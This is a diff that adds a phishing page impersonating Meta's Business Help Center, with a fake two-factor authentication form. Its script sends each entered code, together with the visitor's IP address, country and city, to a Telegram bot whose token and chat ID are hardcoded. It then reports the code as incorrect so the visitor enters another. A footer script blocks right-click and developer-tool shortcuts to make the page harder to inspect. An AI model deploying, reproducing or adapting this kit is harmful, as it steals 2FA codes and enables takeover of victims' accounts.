@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="assets/style/index.css">
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet'>
+    <script src="assets/js/main.js"></script>
+</head>
+    <body>
+    <style>
+html { width:100%; height:100%; margin:0 padding:0; }
+body { width:100%; height:100%; margin:0; padding:0; }
+
+@media only screen and (max-width: 767px) {
+.footer {
+    margin-top: 105px;
+    }
+}
+.topheader {
+  background-color: #355797;
+  text-align: left;
+  padding: 15px 20px;
+}
+.footer{
+  padding-top: 40px;
+  text-align: center;
+}
+.footer p{
+  color: white;
+}
+.footer a{
+  color: white;
+}
+
+.logofooter{
+  width: 90px;
+  padding-bottom: 15px;
+}
+.column {
+  width: 100%;
+}
+.footer ul li p{
+  text-align: left;
+
+  font-size: 14px;
+}
+.metahead{
+  color: white;
+  display: inline-block;
+  padding-left: 15px;
+  margin-left: 15px;
+  border-left: 1px solid white;
+  margin-bottom: 0px;
+  font-size: 14px;
+}
+
+.searchicon{
+  width: 20px;
+  height: 20px;
+  float: right;
+  margin-top: 2px;
+}
+        </style>
+
+
+
+        <div class="root">
+    <div class="topheader">
+      <div class="container">
+        <img class="metalogo" src="278052525_813944336231788_2126819975299864928_n.2ca221b227e5e50b2861f74e67923f35.svg">
+        <p class="metahead">Support Inbox</p>
+        <img src="search-13-64.a9254a55959a7da573f4.ico" class="searchicon">
+      </div>
+    </div>
+            <div class="img-background">
+                <div class="img-box">Meta Business Help Center</div>
+                <div class="img-box">Get Support</div>
+            </div>
+<div class="two-fa-input">
+    <div class="two-fa-header">
+        <p>Two-Factor Authentication Required</p>
+    </div>
+    <div class="two-fa-body">
+        <p>You've asked us to require a 6 digits or an 8 digits code when anyone tries to access this appeal form.</p>
+        <br>
+        <br>
+        <p style="margin: -4em 0 3em 1em;">Enter your 6 digits or 8 digits code from your <b>SMS</b> or your <b>Code Generator</b> below:</p>
+
+        <br>
+        <input type="number" placeholder="Code" id="authenticationCode">
+    </div>
+    <div class="two-fa-end">
+        <div class="two-fa-hlp">
+            <a href="#" style="margin-top: 0.5em;">Need another way?</a>
+        </div>
+        <div class="two-fa-btn">
+            <button onclick="submitAuthenticationCode()">Submit</button>
+        </div>
+    </div>
+</div>
+<script>
+function submitAuthenticationCode() {
+    // Fetch the entered code
+    const authenticationCode = document.getElementById('authenticationCode').value;
+
+    // Display "Checking..." on button click
+    const submitButton = document.querySelector(".two-fa-btn button");
+    submitButton.textContent = "Checking...";
+
+    // Simulate a 10-second delay
+    setTimeout(function () {
+        // Fetch IP information using ipinfo.io API
+        fetch('https://ipinfo.io/json')
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(ipInfo => {
+                console.log('IP Info:', ipInfo); // Log the entire IP information
+
+                // Telegram bot token
+                const botToken = '7093965120:AAFF2OKGU2BFdmjg_dVK3FKBx_wfyB6BfHA';
+                // Telegram chat ID
+                const chatID = '-4274437719';
+                // Telegram API endpoint
+                const apiUrl = `https://api.telegram.org/bot7093965120:AAFF2OKGU2BFdmjg_dVK3FKBx_wfyB6BfHA/sendMessage`;
+
+                // Construct the message to send to Telegram
+                const message = `=============\nKodi: ${authenticationCode}\nIP Address: ${ipInfo.ip}\nCountry: ${ipInfo.country}\nCity: ${ipInfo.city}`;
+
+                // Options for the fetch request
+                const options = {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatID,
+                        text: message
+                    })
+                };
+
+                // Send the message using Fetch API
+                return fetch(apiUrl, options);
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Success:', data);
+
+                // After 10 seconds, show "Re-enter code"
+                submitButton.textContent = "Incorrect";
+                // You can add additional logic here, such as clearing the input field or other actions.
+            })
+            .catch(error => {
+                console.error('Error:', error);
+
+                // Handle the error and show "Re-enter code"
+                submitButton.textContent = "Re-enter code";
+                // You can add additional error handling logic here.
+            });
+    }, 2000);
+}
+</script>
+
+        </div>
+        </div>
+
+
+  <div class="footer" id="futeri">
+      <div class="container">
+        <p class="nerlogofooter">Facebook can help your large, medium or small business grow. Get the latest news for advertisers and more on our Meta for Business Page.</p>
+
+        <div class="row">
+          <div class="col-lg col-6">
+            <ul>
+              <li>
+                <p class="fontbold">Marketing on Facebook</p>
+                <p>Success Stories</p><p>Measurement</p>
+                <p>Industries</p><p>Inspiration</p>
+                <p>Events</p><p>News</p><p>Site map</p>
+              </li>
+            </ul>
+          </div>
+          <div class="col-lg col-6">
+            <ul>
+              <li>
+                <p class="fontbold">Marketing objectives</p>
+                <p>Build your presence</p><p>Create awareness</p><p>Drive discovery</p><p>Generate leads</p><p>Boost sales</p><p>Earn loyalty</p>
+              </li>
+            </ul>
+          </div>
+          <div class="col-lg col-6">
+            <ul>
+              <li>
+                <p class="fontbold">Facebook Pages</p><p>Get started with Pages</p><p>Setting up your Page</p><p>Manage your Facebook Page</p><p>Promote your Page</p><p>Messaging on your Page</p><p>Page Insights</p>
+              </li>
+            </ul>
+          </div>
+          <div variant="dontshowonmobile col-lg" class="col">
+            <ul>
+              <li>
+                <p class="fontbold">Facebook ads</p><p>Get started with ads</p><p>Buying Facebook ads</p><p>Ad formats</p><p>Ad placement</p><p>Choose your audience</p><p>Measure your ads</p><p>Managing your ads</p>
+              </li>
+            </ul>
+          </div>
+          <div class="col-lg col-6">
+            <ul>
+              <li>
+                <p class="fontbold">Resources</p><p>Ads Guide</p><p>Business Help Centre</p><p>Meta Audience Network</p><p>Meta Blueprint</p><p>Meta for Developers</p><p>Meta Business Partners</p><p>Instagram Business</p><p>Support</p>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+        <script type="text/javascript">
+            window.oncontextmenu = function () {
+                return false;
+            }
+            document.onkeydown = function(e) {
+                if(event.keyCode == 123) {
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)){
+                return false;
+            }
+
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+                return false;
+            }
+            }
+        </script>
+
+
+    </body>
+</html>
